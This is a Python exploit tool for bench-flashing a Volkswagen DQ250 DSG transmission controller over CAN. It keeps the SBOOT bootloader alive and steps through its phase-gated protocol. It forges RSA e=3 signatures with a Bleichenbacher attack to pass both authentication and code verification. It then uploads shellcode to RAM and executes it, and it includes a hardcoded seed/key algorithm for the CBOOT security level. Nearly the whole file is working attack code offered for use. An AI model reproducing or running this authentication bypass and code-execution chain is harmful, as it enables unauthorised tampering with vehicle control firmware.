#!/usr/bin/env python3
"""
DQ250 MQB SBOOT Bench Flash Tool

Exploits SBOOT's UDS-like protocol on CAN ID 0x640 to bypass ASW
programming preconditions for bench flashing.

Flow:
  1. Power on ECU, spam keep-alive on 0x640 → keep SBOOT in main loop
     (any CAN msg resets bVar4 in cboot_main_loop, preventing ASW jump)
  2. 1A 8F → set required flag (phase 1→2)
  3. 1A 8A → read data (phase 2→3)
  4. 1A 8B → unlock SA (phase 3→4)
  5. 27 FD/FE → Bleichenbacher RSA-1024 e=3 authentication (phase 4→6)
  4. 31 FB 01 → programming preconditions
  5. 34/36/37 → upload shellcode to DSPR RAM (0xD4000000)
  6. 38 × 2 → execute shellcode (writes reprogram magic + re-enables WDT + spin)
  7. WDT reset → cboot_check_reprogram_request finds 0x55AA1234 → CBOOT programming mode
  8. CBOOT on 0x7E1/0x7E9: SA2 → flash blocks → verify → reset

Usage:
  python3 dq250_bench_flash.py flash --bin 0D9300042M_patched.bin --blocks DRIVER ASW CAL
  python3 dq250_bench_flash.py auth-test            # Test SBOOT auth only
  python3 dq250_bench_flash.py upload --shellcode sc.bin  # Upload + execute custom shellcode
"""

import argparse
import hashlib
import logging
import pathlib
import random
import socket
import struct
import subprocess
import sys
import time
import zlib
from collections import deque

import gmpy2

log = logging.getLogger("dq250")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# SBOOT CAN IDs (direct connection, no gateway)
SBOOT_TXID = 0x640
SBOOT_RXID = 0x641

PAD = 0x55

# SA2 script for CBOOT level 17
SA2_SCRIPT = bytes.fromhex(
    "68028149680593A55A55AA4A0587810595268249845AA5AA558703F780384C"
)

# RSA public key from SBOOT (0x80000d38, 128 bytes, e=3)
SBOOT_RSA_N = int.from_bytes(bytes.fromhex(
    "c934d73e3191029b62e907cdd79aa65a"
    "09d7f8e35c5aafc10e494e6e4f72e871"
    "b73e4cc19105c18b26cf51f6521c5622"
    "03f20403ac563207a970b5ee97723c6b"
    "659fa4baeb928c1db2a217ef02ea3d1e"
    "4868f2a0e48eddfe5f9a7692ca754fb2"
    "7c5f92bff8f8a8e5c7cbc98d46e78043"
    "d2ff6d0021a83967c2aa0ca9e6b965f3"
), "big")
SBOOT_RSA_E = 3

# RSA public key for code verification (0x80000db8, 128 bytes, e=3)
# Used by 31 FE handler to verify uploaded code before Execute is allowed.
# Same weak PKCS#1 v1.5 verification — Bleichenbacher forge works.
SBOOT_RSA_N_VERIFY = int.from_bytes(bytes.fromhex(
    "c44c6455af917c6b25f00b39937ab9c6"
    "87a1c9d217a46129df39584cdf34eba6"
    "d15aef50760b32521b74bce532e2b26f"
    "fc1cb941b318540e918a73b6f522afe0"
    "04fcaeb84df19a3d8ef1b8db52b9079c"
    "315436bbf8acbe1eac35cf07654f5746"
    "1b5802530247f6f7ded63f200aba22fa"
    "ba56ece8ceb338389d8bf78db813bd17"
), "big")

# Block definitions
BLOCKS = {
    "DRIVER": {"number": 2, "identifier": 0x30, "bin_offset": 0x00000, "length": 0x80E,    "transfer_size": 0x4B0, "erase": False, "flash_addr": None},
    "ASW":    {"number": 3, "identifier": 0x50, "bin_offset": 0x50000, "length": 0x130000, "transfer_size": 0x800, "erase": True,  "flash_addr": 0xA0040000},
    "CAL":    {"number": 4, "identifier": 0x51, "bin_offset": 0x30000, "length": 0x20000,  "transfer_size": 0x800, "erase": True,  "flash_addr": 0xA0020000},
}
# SBOOT memory region table:
#   Entry 5: 0xA0020000-0xA003FFFF (128K) → CAL
#   Entry 6: 0xA0040000-0xA016FFFF (1216K) → ASW
# DRIVER has no flash address — it's uploaded to RAM during flashing.
WORKSHOP_CODE = bytes([0x20, 0x4, 0x20, 0x42, 0x04, 0x20, 0x42, 0xB1, 0x3D])

# Shellcode upload address (TC1766 DSPR RAM, global segment)
# Memory table entry 8: 0xD4000000-0xD4003FFF, flags 0x1C00 (RAM, 16KB)
# Also valid: 0xD0000000-0xD0000FFF (4KB only)
SHELLCODE_ADDR = 0xD4000000


def jamcrc(data: bytes) -> int:
    """JAMCRC = bitwise NOT of CRC32 (used by DSG for internal block checksums)."""
    return 0xFFFFFFFF - zlib.crc32(data)


def verify_block_jamcrc(bin_data: bytes, block_name: str) -> tuple[bool, int, int]:
    """
    Verify JAMCRC of a block in the bin file.
    Returns (valid, expected_crc, actual_crc).
    JAMCRC is stored in the last 4 bytes of each block.
    DRIVER (block 2) uses external UDS checksum, not JAMCRC — skip it.
    """
    info = BLOCKS[block_name]
    offset = info["bin_offset"]
    length = info["length"]
    block_data = bin_data[offset:offset + length]

    if len(block_data) < 4:
        return (False, 0, 0)

    stored_crc = struct.unpack("<I", block_data[-4:])[0]
    calc_crc = jamcrc(block_data[:-4])
    return (stored_crc == calc_crc, stored_crc, calc_crc)


def fix_block_jamcrc(bin_data: bytearray, block_name: str) -> int:
    """Fix JAMCRC in a block. Returns the new CRC. Modifies bin_data in-place."""
    info = BLOCKS[block_name]
    offset = info["bin_offset"]
    length = info["length"]
    crc = jamcrc(bin_data[offset:offset + length - 4])
    struct.pack_into("<I", bin_data, offset + length - 4, crc)
    return crc


# ---------------------------------------------------------------------------
# SA2 seed/key VM (for CBOOT auth)
# ---------------------------------------------------------------------------

class Sa2SeedKey:
    def __init__(self, instruction_tape, seed):
        self.instruction_tape = instruction_tape
        self.register = seed
        self.carry_flag = 0
        self.instruction_pointer = 0
        self.for_pointers = deque()
        self.for_iterations = deque()

    def rsl(self):
        self.carry_flag = self.register & 0x80000000
        self.register = ((self.register << 1) | (1 if self.carry_flag else 0)) & 0xFFFFFFFF
        self.instruction_pointer += 1

    def rsr(self):
        self.carry_flag = self.register & 0x1
        self.register = (self.register >> 1) | (0x80000000 if self.carry_flag else 0)
        self.instruction_pointer += 1

    def add(self):
        self.carry_flag = 0
        ops = self.instruction_tape[self.instruction_pointer + 1:self.instruction_pointer + 5]
        val = ops[0] << 24 | ops[1] << 16 | ops[2] << 8 | ops[3]
        out = self.register + val
        if out > 0xFFFFFFFF:
            self.carry_flag = 1
            out &= 0xFFFFFFFF
        self.register = out
        self.instruction_pointer += 5

    def sub(self):
        self.carry_flag = 0
        ops = self.instruction_tape[self.instruction_pointer + 1:self.instruction_pointer + 5]
        val = ops[0] << 24 | ops[1] << 16 | ops[2] << 8 | ops[3]
        out = self.register - val
        if out < 0:
            self.carry_flag = 1
            out &= 0xFFFFFFFF
        self.register = out
        self.instruction_pointer += 5

    def eor(self):
        ops = self.instruction_tape[self.instruction_pointer + 1:self.instruction_pointer + 5]
        val = ops[0] << 24 | ops[1] << 16 | ops[2] << 8 | ops[3]
        self.register ^= val
        self.instruction_pointer += 5

    def one(self):
        self.register = 1
        self.instruction_pointer += 1

    def _for(self):
        it = self.instruction_tape[self.instruction_pointer + 1]
        self.for_pointers.append(self.instruction_pointer)
        self.for_iterations.append(it)
        self.instruction_pointer += 2

    def next_iter(self):
        if not self.for_iterations:
            self.instruction_pointer += 1
            return
        self.for_iterations[-1] -= 1
        if self.for_iterations[-1] <= 0:
            self.for_pointers.pop()
            self.for_iterations.pop()
            self.instruction_pointer += 1
        else:
            self.instruction_pointer = self.for_pointers[-1] + 2

    def bcc(self):
        if self.carry_flag:
            self.instruction_pointer += 2
        else:
            self.instruction_pointer += self.instruction_tape[self.instruction_pointer + 1] + 2

    def execute(self):
        opcodes = {
            0x81: self.rsl, 0x82: self.rsr, 0x93: self.add,
            0x84: self.sub, 0x87: self.eor, 0x68: self._for,
            0x49: self.next_iter, 0x4A: self.next_iter,
            0x80: self.one, 0x95: self.bcc,
        }
        while self.instruction_pointer < len(self.instruction_tape):
            opcode = self.instruction_tape[self.instruction_pointer]
            func = opcodes.get(opcode)
            if func is None:
                break
            func()
        return self.register


# ---------------------------------------------------------------------------
# Bleichenbacher RSA-PKCS#1 v1.5 forge (e=3)
# ---------------------------------------------------------------------------
#
# SBOOT FUN_80007404 has two implementation flaws:
#   1. Padding bytes are checked for != 0x00, NOT == 0xFF
#   2. Nothing is verified after the 20-byte hash (trailing garbage ignored)
#
# With e=3 and 1024-bit key, the cube root controls ~340 top bits of sig^3.
# The strict PKCS#1 prefix (00 01 FF*8 00 DigestInfo Hash) is 46 bytes =
# 368 bits — too many. But since padding bytes just need to be non-zero,
# we have 64 bits of freedom there, reducing the fixed constraint to ~304
# bits, well within the cube root's precision.
#
# Approach: try random 8-byte padding values (each non-zero), compute
# cube root, check if sig^3 matches all constraints. Expected ~200K
# attempts needed (~2-5 seconds).

# SHA-1 DigestInfo (15 bytes, RFC 3447)
_DIGEST_INFO = bytes.fromhex("3021300906052b0e03021a05000414")


def bleichenbacher_forge(hash_bytes: bytes, key_bytes: int = 128,
                         max_attempts: int = 3_000_000,
                         rsa_n: int | None = None) -> bytes:
    """
    Forge RSA-PKCS#1.5 SHA-1 signature for e=3.

    Exploits SBOOT's weak PKCS#1 v1.5 verification:
      - Padding bytes only checked != 0 (not == 0xFF)
      - No check on bytes after the hash

    This allows finding M where M^3 (exact, no mod N) matches the
    relaxed PKCS#1 structure by varying the padding bytes.

    Args:
        hash_bytes: 20-byte SHA-1 hash
        key_bytes: RSA key size in bytes (128 = 1024 bits)
        max_attempts: max random padding attempts
        rsa_n: RSA modulus (default: SBOOT_RSA_N for auth)

    Returns:
        Forged 128-byte signature
    """
    assert len(hash_bytes) == 20, f"Expected 20-byte hash, got {len(hash_bytes)}"

    N = rsa_n if rsa_n is not None else SBOOT_RSA_N
    key_bits = key_bytes * 8

    for attempt in range(max_attempts):
        # Random 8-byte non-zero padding
        padding = bytes([random.randint(1, 255) for _ in range(8)])

        # Construct target: 00 01 [padding 8] 00 [DigestInfo 15] [hash 20] [00*82]
        prefix = b'\x00\x01' + padding + b'\x00' + _DIGEST_INFO + hash_bytes
        target_min = int.from_bytes(prefix + b'\x00' * (key_bytes - len(prefix)), 'big')
        target_max = int.from_bytes(prefix + b'\xff' * (key_bytes - len(prefix)), 'big')

        M_lo = int(gmpy2.iroot(target_min, 3)[0])
        M_hi = int(gmpy2.iroot(target_max, 3)[0])

        for M in (M_lo, M_lo + 1, M_hi, M_hi + 1):
            cube = M * M * M
            if cube >= N or cube.bit_length() > key_bits:
                continue

            rb = cube.to_bytes(key_bytes, 'big')

            if (rb[0] == 0x00 and rb[1] == 0x01
                    and all(b != 0 for b in rb[2:10])
                    and rb[10] == 0x00
                    and rb[11:26] == _DIGEST_INFO
                    and rb[26:46] == hash_bytes):
                log.info(f"  Forge found in {attempt + 1} attempts")
                return M.to_bytes(key_bytes, 'big')

        if attempt % 100_000 == 0 and attempt > 0:
            log.info(f"  ...{attempt} attempts...")

    raise RuntimeError(
        f"Bleichenbacher forge failed after {max_attempts} attempts. "
        f"Retry with new seed (power cycle + re-request)."
    )


# ---------------------------------------------------------------------------
# Raw CAN socket
# ---------------------------------------------------------------------------

CAN_FRAME_FMT = "=IB3x8s"
CAN_FRAME_SIZE = struct.calcsize(CAN_FRAME_FMT)


class RawCAN:
    """Raw CAN socket — survives power cycles, no kernel ISO-TP state."""

    def __init__(self, interface: str):
        self.sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
        self.sock.bind((interface,))
        self.sock.settimeout(0)
        self.interface = interface

    def send_frame(self, can_id: int, data: bytes):
        data = data.ljust(8, bytes([PAD]))[:8]
        frame = struct.pack(CAN_FRAME_FMT, can_id, len(data), data)
        self.sock.send(frame)

    def recv_frame(self, timeout: float = 1.0) -> tuple[int, bytes] | None:
        self.sock.settimeout(timeout)
        try:
            frame = self.sock.recv(CAN_FRAME_SIZE)
            can_id, dlc, data = struct.unpack(CAN_FRAME_FMT, frame)
            can_id &= 0x1FFFFFFF
            return (can_id, data[:dlc])
        except (socket.timeout, BlockingIOError):
            return None

    def recv_frame_filtered(self, can_id: int, timeout: float = 1.0) -> bytes | None:
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return None
            result = self.recv_frame(timeout=remaining)
            if result is None:
                return None
            if result[0] == can_id:
                return result[1]

    def drain(self):
        self.sock.settimeout(0)
        try:
            while True:
                self.sock.recv(CAN_FRAME_SIZE)
        except (socket.timeout, BlockingIOError):
            pass

    def close(self):
        self.sock.close()


# ---------------------------------------------------------------------------
# ISO-TP over raw CAN
# ---------------------------------------------------------------------------

class ISOTP:
    """ISO-TP framing over raw CAN."""

    def __init__(self, can: RawCAN, tx_id: int, rx_id: int):
        self.can = can
        self.tx_id = tx_id
        self.rx_id = rx_id
        self.stmin = 0.001

    def send(self, data: bytes):
        length = len(data)
        if length <= 7:
            self.can.send_frame(self.tx_id, bytes([length]) + data)
        else:
            ff = bytes([0x10 | ((length >> 8) & 0x0F), length & 0xFF]) + data[:6]
            self.can.send_frame(self.tx_id, ff)
            fc = self._wait_fc()
            if fc is None:
                raise TimeoutError("No Flow Control received")
            bs = fc[1] if len(fc) > 1 else 0
            st = fc[2] if len(fc) > 2 else 0
            stmin = self._parse_stmin(st)

            offset = 6
            seq = 1
            block_count = 0
            while offset < length:
                chunk = data[offset:offset + 7]
                self.can.send_frame(self.tx_id, bytes([0x20 | (seq & 0x0F)]) + chunk)
                offset += 7
                seq = (seq + 1) & 0x0F
                block_count += 1
                time.sleep(stmin if stmin > 0 else self.stmin)
                if bs > 0 and block_count >= bs and offset < length:
                    fc = self._wait_fc()
                    if fc is None:
                        raise TimeoutError("No FC after block")
                    block_count = 0

    def recv(self, timeout: float = 5.0) -> bytes | None:
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return None
            frame = self.can.recv_frame_filtered(self.rx_id, timeout=remaining)
            if frame is None:
                return None
            pci_type = (frame[0] >> 4) & 0x0F
            if pci_type == 0:
                sf_len = frame[0] & 0x0F
                return frame[1:1 + sf_len] if sf_len > 0 else None
            elif pci_type == 1:
                total_len = ((frame[0] & 0x0F) << 8) | frame[1]
                buf = bytearray(frame[2:8])
                self.can.send_frame(self.tx_id, bytes([0x30, 0x00, 0x00]))
                expected_seq = 1
                while len(buf) < total_len:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        return None
                    cf = self.can.recv_frame_filtered(self.rx_id, timeout=remaining)
                    if cf is None:
                        return None
                    if (cf[0] >> 4) != 2:
                        continue
                    buf.extend(cf[1:8])
                    expected_seq = (expected_seq + 1) & 0x0F
                return bytes(buf[:total_len])

    def _wait_fc(self, timeout: float = 5.0) -> bytes | None:
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return None
            frame = self.can.recv_frame_filtered(self.rx_id, timeout=remaining)
            if frame is None:
                return None
            if (frame[0] >> 4) == 3:
                return frame

    @staticmethod
    def _parse_stmin(st: int) -> float:
        if st <= 0x7F:
            return st / 1000.0
        elif 0xF1 <= st <= 0xF9:
            return (st - 0xF0) * 0.0001
        return 0.001


# ---------------------------------------------------------------------------
# UDS client
# ---------------------------------------------------------------------------

class UDSError(Exception):
    NRC_NAMES = {
        0x10: "generalReject", 0x11: "serviceNotSupported",
        0x12: "subFunctionNotSupported", 0x13: "incorrectMessageLengthOrInvalidFormat",
        0x14: "responseTooLong", 0x22: "conditionsNotCorrect",
        0x24: "requestSequenceError", 0x25: "noResponseFromSubnetComponent",
        0x31: "requestOutOfRange", 0x33: "securityAccessDenied",
        0x35: "invalidKey", 0x36: "exceededNumberOfAttempts",
        0x37: "requiredTimeDelayNotExpired", 0x70: "uploadDownloadNotAccepted",
        0x71: "transferDataSuspended", 0x72: "generalProgrammingFailure",
        0x73: "wrongBlockSequenceCounter",
        0x78: "requestCorrectlyReceivedResponsePending",
        0x7E: "subFunctionNotSupportedInActiveSession",
        0x7F: "serviceNotSupportedInActiveSession",
    }

    def __init__(self, service, nrc):
        self.service = service
        self.nrc = nrc
        name = self.NRC_NAMES.get(nrc, "unknown")
        super().__init__(f"NRC 0x{nrc:02x} ({name}) for service 0x{service:02x}")


class UDSClient:
    """UDS client over ISO-TP."""

    def __init__(self, isotp: ISOTP, timeout: float = 5.0):
        self.isotp = isotp
        self.timeout = timeout

    def _request(self, data: bytes, timeout: float | None = None) -> bytes:
        if timeout is None:
            timeout = self.timeout

        self.isotp.send(data)
        while True:
            resp = self.isotp.recv(timeout=timeout)
            if resp is None:
                raise TimeoutError(f"No response for service 0x{data[0]:02x}")

            if resp[0] == 0x7F:
                if len(resp) >= 3 and resp[2] == 0x78:
                    log.debug("Response pending (0x78)")
                    timeout = 30.0
                    continue
                if len(resp) >= 3:
                    raise UDSError(resp[1], resp[2])
                raise UDSError(data[0], resp[1] if len(resp) > 1 else 0)
            if resp[0] == data[0] + 0x40:
                return resp
            log.warning(f"Unexpected response: {resp.hex()}")

    def diagnostic_session_control(self, session: int) -> bytes:
        log.info(f"DSC(0x{session:02x})")
        return self._request(bytes([0x10, session]))

    def security_access_seed(self, level: int) -> bytes:
        log.info(f"SA seed (level 0x{level:02x})")
        resp = self._request(bytes([0x27, level]))
        return resp[2:]

    def security_access_key(self, level: int, key: bytes) -> bytes:
        log.info(f"SA key (level 0x{level + 1:02x}, {len(key)} bytes)")
        return self._request(bytes([0x27, level + 1]) + key)

    def unlock_sa2(self, level: int, sa2_script: bytes):
        seed = self.security_access_seed(level)
        seed_int = int.from_bytes(seed, "big")
        log.info(f"  Seed: 0x{seed_int:08x}")
        if seed_int == 0:
            log.info("  Already unlocked")
            return
        vm = Sa2SeedKey(sa2_script, seed_int)
        key_int = vm.execute()
        key = key_int.to_bytes(4, "big")
        log.info(f"  Key:  0x{key_int:08x}")
        self.security_access_key(level, key)
        log.info("  SA2 unlocked!")

    def tester_present(self) -> bytes:
        return self._request(bytes([0x3E, 0x00]))

    def ecu_reset(self, reset_type: int = 0x01) -> bytes:
        log.info(f"ECUReset(0x{reset_type:02x})")
        return self._request(bytes([0x11, reset_type]))

    def write_data_by_identifier(self, did: int, data: bytes) -> bytes:
        return self._request(bytes([0x2E, did >> 8, did & 0xFF]) + data)

    def read_memory_by_address(self, address: int, length: int) -> bytes:
        """ReadMemoryByAddress (0x23) — read ECU memory."""
        # addressAndLengthFormatIdentifier: 4 bytes address, 2 bytes length
        alfid = 0x42
        data = bytes([0x23, alfid]) + struct.pack(">I", address) + struct.pack(">H", length)
        resp = self._request(data)
        return resp[1:]  # skip positive response SID

    def routine_control_start(self, routine_id: int, data: bytes = b"") -> bytes:
        log.info(f"RoutineControl(0x{routine_id:04x})")
        return self._request(
            bytes([0x31, 0x01, routine_id >> 8, routine_id & 0xFF]) + data,
            timeout=30.0,
        )

    def request_download(self, block_id: int, length: int,
                         compression=1, encryption=1) -> int:
        dfi = (compression << 4) | encryption
        alfid = 0x14
        log.info(f"RequestDownload(block=0x{block_id:02x}, len=0x{length:x})")
        resp = self._request(
            bytes([0x34, dfi, alfid, block_id]) + struct.pack(">I", length)
        )
        lfs = (resp[1] >> 4) & 0xF
        max_block = int.from_bytes(resp[2:2 + lfs], "big")
        log.debug(f"  Max block: {max_block}")
        return max_block

    def transfer_data(self, counter: int, data: bytes) -> bytes:
        return self._request(bytes([0x36, counter & 0xFF]) + data, timeout=10.0)

    def request_transfer_exit(self) -> bytes:
        log.info("RequestTransferExit")
        return self._request(bytes([0x37]))


# ---------------------------------------------------------------------------
# SBOOT client (CAN ID 0x640/0x641, special UDS-like protocol)
# ---------------------------------------------------------------------------

class SbootClient:
    """
    SBOOT UDS-like client on CAN 0x640/0x641.

    SBOOT handler table at 0x80000a84 (20 bytes per entry):
      Phase-gated protocol — DAT_d000a55c must match handler's bit in flag table.

      Phase 0: 10 84  → enter session (advances to phase 1)
      Phase 1: 1A 8F  → set required flag (→ phase 2)
      Phase 2: 1A 8A  → read data (→ phase 3)
      Phase 3: 1A 8B  → unlock SA (→ phase 4)
      Phase 4: 27 FD  → seed request, 20-byte SHA-1 (→ phase 5)
      Phase 5: 27 FE  → key send, 128-byte RSA-PKCS#1.5 (→ phase 6)
      Phase 7+: 31 FB → programming preconditions
               34    → request download
               36    → transfer data
               37    → transfer exit
               38    → execute (two-phase)
    """

    def __init__(self, can: RawCAN):
        self.can = can
        self.isotp = ISOTP(can, SBOOT_TXID, SBOOT_RXID)
        self.timeout = 3.0

    def _request(self, data: bytes, timeout: float | None = None) -> bytes:
        """Send request, handle NRC 0x78 (pending), return positive response."""
        if timeout is None:
            timeout = self.timeout
        self.isotp.send(data)
        while True:
            resp = self.isotp.recv(timeout=timeout)
            if resp is None:
                raise TimeoutError(f"SBOOT: no response for 0x{data[0]:02x}")
            if resp[0] == 0x7F:
                if len(resp) >= 3 and resp[2] == 0x78:
                    timeout = 30.0
                    continue
                if len(resp) >= 3:
                    raise UDSError(resp[1], resp[2])
                raise UDSError(data[0], resp[1] if len(resp) > 1 else 0)
            if resp[0] == data[0] + 0x40:
                return resp
            log.debug(f"SBOOT unexpected: {resp.hex()}")

    def enter_session(self, max_retries: int = 50, interval: float = 0.05) -> bool:
        """
        Spam messages on 0x640 during SBOOT boot window to keep it alive.

        SBOOT always enters cboot_main_loop() after init. Any received CAN
        message on 0x640 resets the loop counter (bVar4=0), preventing the
        jump to CBOOT/ASW. There is no 0x10 handler — the catch-all returns
        NRC 0x12, but that proves SBOOT is alive and keeps it in the loop.
        """
        log.info(f"Spamming keep-alive on 0x{SBOOT_TXID:03x} ({max_retries} attempts)...")
        for i in range(max_retries):
            try:
                # Send any single-frame UDS request to keep SBOOT alive
                self.can.send_frame(SBOOT_TXID, bytes([0x02, 0x10, 0x84]))
                resp = self.can.recv_frame_filtered(SBOOT_RXID, timeout=interval)
                if resp is not None:
                    pci_len = resp[0] & 0x0F
                    if pci_len >= 1:
                        # Any response (positive or NRC) means SBOOT is alive
                        log.info(f"  SBOOT alive! (attempt {i + 1}, resp: {resp[:pci_len+1].hex()})")
                        return True
            except Exception:
                pass
        return False

    def get_data_8f(self):
        """1A 8F — sets required internal flag."""
        log.info("SBOOT: 1A 8F (set flag)")
        return self._request(bytes([0x1A, 0x8F]))

    def request_seed(self) -> bytes:
        """27 FD — returns 20-byte SHA-1 seed."""
        log.info("SBOOT: 27 FD (request seed)")
        resp = self._request(bytes([0x27, 0xFD]))
        # Response: 67 FD [seed_20_bytes]
        seed = resp[2:]
        log.info(f"  Seed ({len(seed)} bytes): {seed.hex()}")
        return seed

    def send_key(self, signature: bytes):
        """27 FE — send 128-byte RSA signature."""
        log.info(f"SBOOT: 27 FE (send key, {len(signature)} bytes)")
        return self._request(bytes([0x27, 0xFE]) + signature)

    def get_data_8a(self):
        """1A 8A — phase 2→3 transition."""
        log.info("SBOOT: 1A 8A")
        return self._request(bytes([0x1A, 0x8A]))

    def get_data_8b(self):
        """1A 8B — phase 3→4 transition (unlocks SA)."""
        log.info("SBOOT: 1A 8B")
        return self._request(bytes([0x1A, 0x8B]))

    def authenticate(self):
        """Full SBOOT authentication: 1A 8F → 1A 8A → 1A 8B → 27 FD → forge → 27 FE."""
        # Phase 1→2: set required flag
        self.get_data_8f()
        # Phase 2→3
        self.get_data_8a()
        # Phase 3→4: unlock SA
        self.get_data_8b()

        seed = self.request_seed()
        if len(seed) != 20:
            raise ValueError(f"Expected 20-byte seed, got {len(seed)}")

        # SBOOT stores seed at d000a014, then rsa_set_message_hash feeds it
        # into a SHA-1 context. rsa_get_expected_hash finalizes → SHA-1(seed).
        # So the PKCS#1 signature must contain SHA-1(seed), not raw seed.
        seed_hash = hashlib.sha1(seed).digest()
        log.info(f"  SHA-1(seed): {seed_hash.hex()}")

        log.info("Forging Bleichenbacher RSA signature (e=3)...")
        signature = bleichenbacher_forge(seed_hash)
        log.info(f"  Forged sig: {signature[:16].hex()}...")

        self.send_key(signature)
        log.info("*** SBOOT AUTHENTICATED ***")

    def programming_preconditions(self):
        """31 FB 01 — set programming state flags."""
        log.info("SBOOT: 31 FB 01 (programming preconditions)")
        return self._request(bytes([0x31, 0xFB, 0x01]))

    def request_download_raw(self, address: int, length: int, mem_type: int = 0):
        """
        34 — request download to address.
        Format: 34 [addr_BE_4] [type_1] [len_BE_4]
        """
        log.info(f"SBOOT: RequestDownload(0x{address:08x}, 0x{length:x}, type={mem_type})")
        data = (bytes([0x34])
                + struct.pack(">I", address)
                + bytes([mem_type])
                + struct.pack(">I", length))
        return self._request(data)

    def transfer_data_raw(self, data: bytes):
        """
        36 — transfer data block.
        SBOOT format: 36 [raw data] — NO block counter (unlike standard UDS).
        For DSPR RAM (>= 0xD4000000), data length must be even (u16 copy).
        """
        return self._request(bytes([0x36]) + data, timeout=10.0)

    def transfer_exit(self):
        """37 — end transfer."""
        log.info("SBOOT: TransferExit")
        return self._request(bytes([0x37]))

    def check_routine(self, shellcode: bytes):
        """
        31 FE [128-byte RSA signature] — verify uploaded code.

        SBOOT phase gate requires this between TransferExit and Execute:
          phase 9 (after TD) → 37 → phase 10 → 31 FE → phase 11 → 38 ✓

        The handler at 0x80004d68 computes SHA-1 over the uploaded data
        (at the RequestDownload address), then verifies a PKCS#1 v1.5
        RSA signature using the verify key at 0x80000db8 (e=3).
        Same weak verification as auth — Bleichenbacher forge works.

        If verification FAILS for RAM uploads, the handler zeros out the
        uploaded data before returning NRC!
        """
        data_hash = hashlib.sha1(shellcode).digest()
        log.info(f"SBOOT: 31 FE (check routine, hash={data_hash.hex()})")
        signature = bleichenbacher_forge(data_hash, rsa_n=SBOOT_RSA_N_VERIFY)
        log.info(f"  Forged verify signature ({len(signature)} bytes)")
        return self._request(bytes([0x31, 0xFE]) + signature)

    def execute(self, address: int) -> bool:
        """
        38 — execute code at address (two-phase).
        First call: sets flag, returns 0x78+0x40.
        Second call: actually jumps to code.

        Returns True if phase 2 got a positive response (code returned via RET),
        False if timeout (code is still running / never returned).
        """
        addr_bytes = struct.pack(">I", address)
        data = bytes([0x38]) + addr_bytes

        log.info(f"SBOOT: Execute phase 1 (0x{address:08x})")
        self._request(data)

        log.info(f"SBOOT: Execute phase 2 (jumping to code!)")
        try:
            resp = self._request(data, timeout=3.0)
            log.info(f"  Execute phase 2 response: {resp.hex()}")
            return True
        except TimeoutError:
            log.info("  No response (code running or trapped)")
            return False

    def upload_and_execute(self, shellcode: bytes, address: int = SHELLCODE_ADDR,
                           chunk_size: int = 0x80,
                           execute_address: int | None = None):
        """Upload shellcode to RAM and execute it.

        Args:
            shellcode: Code/data to upload.
            address: RAM address to upload to.
            chunk_size: Transfer chunk size.
            execute_address: Address to execute at (default: same as upload address).
                             Use when the entry point differs from the upload base,
                             e.g. DRIVER data at 0xD4000000 but code at 0xD4000900.
        """
        # Pad to even length (SBOOT copies u16 for DSPR addresses >= 0xD4000000)
        if len(shellcode) % 2:
            shellcode = shellcode + b'\x00'

        self.programming_preconditions()
        self.request_download_raw(address, len(shellcode), mem_type=0)

        for offset in range(0, len(shellcode), chunk_size):
            chunk = shellcode[offset:offset + chunk_size]
            log.debug(f"  Transfer {offset:#x}-{offset+len(chunk):#x} ({len(chunk)} bytes)")
            self.transfer_data_raw(chunk)

        # Phase flow: 34 → phase 8, 36 → phase 9, 37 → phase 10,
        #             31 FE → phase 11, 38 → allowed at phase 11
        self.transfer_exit()
        self.check_routine(shellcode)

        exec_addr = execute_address if execute_address is not None else address
        log.info(f"Shellcode uploaded & verified: {len(shellcode)} bytes at 0x{address:08x}")
        log.info(f"Executing at 0x{exec_addr:08x}")
        return self.execute(exec_addr)


# ---------------------------------------------------------------------------
# Relay / power control
# ---------------------------------------------------------------------------

def power_cycle_relay(gpio_pin: int, off_time: float = 2.0):
    log.info(f"Power OFF (GPIO {gpio_pin})")
    subprocess.run(["pinctrl", "set", str(gpio_pin), "dh"], check=True)
    time.sleep(off_time)
    log.info(f"Power ON (GPIO {gpio_pin})")
    subprocess.run(["pinctrl", "set", str(gpio_pin), "dl"], check=True)


def power_cycle_manual():
    input("\nPower cycle the ECU now, then press ENTER...")


# ---------------------------------------------------------------------------
# Block preparation
# ---------------------------------------------------------------------------

def extract_block(bin_data: bytes, block_name: str) -> bytes:
    info = BLOCKS[block_name]
    offset = info["bin_offset"]
    length = info["length"]
    block = bin_data[offset:offset + length]
    if len(block) != length:
        raise ValueError(f"{block_name}: expected {length} bytes, got {len(block)}")
    return block


# ---------------------------------------------------------------------------
# TriCore instruction encoder helpers (kept for _build_flash_manager)
# ---------------------------------------------------------------------------
# (SHELLCODE_REPROGRAM removed — CBOOT programming mode doesn't work on bench)

# ---------------------------------------------------------------------------
# TriCore instruction encoder helpers
# ---------------------------------------------------------------------------

def _tc_rlc(opcode: int, c: int, const16: int, s1: int = 0) -> bytes:
    """Encode TriCore RLC format: MOV.U, ADDIH, MOVH.A, etc."""
    word = ((c & 0xF) << 28
            | ((const16 >> 4) & 0xFFF) << 16
            | (const16 & 0xF) << 12
            | (s1 & 0xF) << 8
            | (opcode & 0xFF))
    return word.to_bytes(4, "little")


def _tc_bol(opcode: int, c: int, b: int, off16: int) -> bytes:
    """Encode TriCore BOL format: LEA, ST.W, LD.W with 16-bit offset."""
    o = off16 & 0xFFFF
    word = (((o >> 6) & 0xF) << 28     # bits[31:28] = off16[9:6]
            | ((o >> 10) & 0x3F) << 22  # bits[27:22] = off16[15:10]
            | (o & 0x3F) << 16          # bits[21:16] = off16[5:0]
            | (b & 0xF) << 12
            | (c & 0xF) << 8
            | (opcode & 0xFF))
    return word.to_bytes(4, "little")


def _tc_movh_a(reg: int, const16: int) -> bytes:
    return _tc_rlc(0x91, reg, const16)


def _tc_mov_u(reg: int, const16: int) -> bytes:
    return _tc_rlc(0xBB, reg, const16)


def _tc_addih(dst: int, src: int, const16: int) -> bytes:
    return _tc_rlc(0x9B, dst, const16, s1=src)


def _tc_lea(dst: int, base: int, off16: int) -> bytes:
    return _tc_bol(0xD9, dst, base, off16)


